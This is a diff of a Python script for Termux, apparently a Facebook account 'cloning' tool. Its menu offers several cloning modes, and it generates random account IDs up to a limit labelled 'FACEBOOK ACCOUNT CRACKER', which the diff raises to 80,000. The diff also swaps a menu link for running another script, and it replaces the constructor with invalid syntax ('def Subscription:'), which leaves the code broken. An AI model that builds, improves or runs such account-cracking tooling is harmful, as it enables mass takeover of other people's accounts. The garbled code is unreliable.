@@ -417,7 +417,7 @@ __________________×__×____________________
 __________________×__×____________________\033[1;37m""")
 
 class Main:
-	def __init__(self):
+	def Subscription:
 		self.id = []
 		self.ok = []
 		self.cp = []
@@ -428,14 +428,14 @@ class Main:
 		print(" [2] Public Cloning")
 		print(" [3] 2007-10 Cloning")
 		print(" [4] 2011-15 Cloning")
-		print(" [5] My Facebook Account")
+		print(" [5] Create File")
 		JAHIED =input(" Choose : ")
 		if JAHIED in ["1", "01"]:
 			File()
 		if JAHIED in ["2", "02"]:
 			Public()
 		if JAHIED in ["5", "05"]:
-			os.system("https://www.facebook.com/SultanHizirReis")
+			os.system("python Shafiq.py")
 		if JAHIED in ["3", "03"]:
 			self.old()
 		if JAHIED in ["4", "04"]:
@@ -451,7 +451,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system('clear');print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m FACEBOOK ACCOUNT CRACKER - LIMIT 50,000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m FACEBOOK ACCOUNT CRACKER - LIMIT 80,000: "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -1301,7 +1301,7 @@ class Main:
 		self.loop +=1
 
 
-def Subscraption():
+def Subscription():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
 	clear()
 	print(logo)
